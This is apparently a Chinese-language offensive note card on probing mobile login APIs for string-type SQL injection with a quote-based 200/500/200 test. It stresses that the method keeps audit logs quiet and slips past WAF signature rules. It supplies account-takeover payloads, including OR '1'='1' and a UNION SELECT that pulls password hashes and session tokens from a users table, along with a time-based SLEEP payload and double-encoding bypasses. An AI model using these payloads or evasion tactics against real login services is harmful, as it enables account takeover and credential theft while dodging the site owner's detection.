# SQLi 最小化探型三步法（200→500→200）→ Account Takeover

> 来源：@Zerodaylabowner (Zer0DAY Lab) 2026-09 推文 · 吸收评级 ★★★★
> 场景：移动端/APP 登录口，JSON body，WAF 审计在旁边看着

## 核心判定法（三步探型）

对登录/校验类接口的字符串参数，**不要直接轰 payload**，先用一对引号探明注入类型：

```
POST /api/login
{"mobile_number":"8888888888"}     → 200   基线正常
{"mobile_number":"8888888888'"}    → 500   报错 → SQL 语法被破坏 = 注入点实锤
{"mobile_number":"8888888888''"}   → 200   引号闭合 → 字符串型注入确认
```

判定表：

| 观测 | 含义 | 下一步 |
|---|---|---|
| `'`→200 无差异 | 可能被转义/参数化/前端过滤 | 试 `%27`、双写 `''`、反斜杠 `\` 探 |
| `'`→500 | 字符串型注入 | `''` 闭合确认后走 UNION/布尔/时间盲注 |
| `'`→403/WAF页 | 审计规则命中单引号 | 换 `%%2727` 双编码或注释符切分（见 bypass 卡） |
| `'`→500 但 `''` 仍 500 | 报错不一定回显 | 走时间盲注 `';SELECT SLEEP(5)--` |

## 为什么这比直接轰 payload 强

1. **审计面小**：日志里只有一对引号差异，不触发 `or 1=1 / union select` 类特征规则
2. **类型先明**：字符串型 vs 数字型决定后续全部语法，探错方向整轮白费
3. **500→200 自带布尔判定**：报错型注入可以直接用「500=假 / 200=真」当 oracle，不需要等盲注延时

## ATO 收口（探型完成后）

字符串型确认后，在登录口注入的目标不是脱库，是**改绑会话**：

```sql
-- 手机号参数位（字符串型）：
8888888888' OR '1'='1' --          → 返回第一条用户（往往是 admin）= 登录成别人
8888888888' UNION SELECT phone,pass_hash,sesstoken FROM users LIMIT 1 --
-- 若登录成功返回体带 token/sessionId → 直接接管，不用猜密码
```

## 与本仓库的关系

- 配合 `auth-security/` 的会话固定/弱绑定材料 = 完整 ATO 链
- 配合 `api-security/api-authorization-and-bola/` = 登录后改 id 横向
- WAF 交互变体见 `FUSION-20260920-absorb.md` 的「签名只看方法+路径」卡

## 判据速查（评审时复用）

```
探型三连: 原200 / '500 / ''200  = 字符串型注入 confirmed
探型三连: 原200 / '200 / ''200  = 参数化或过滤, 换编码层打
探型三连: 原200 / '403 / ''403  = WAF特征, 走编码绕过卡, 接口本身可能没问题
```
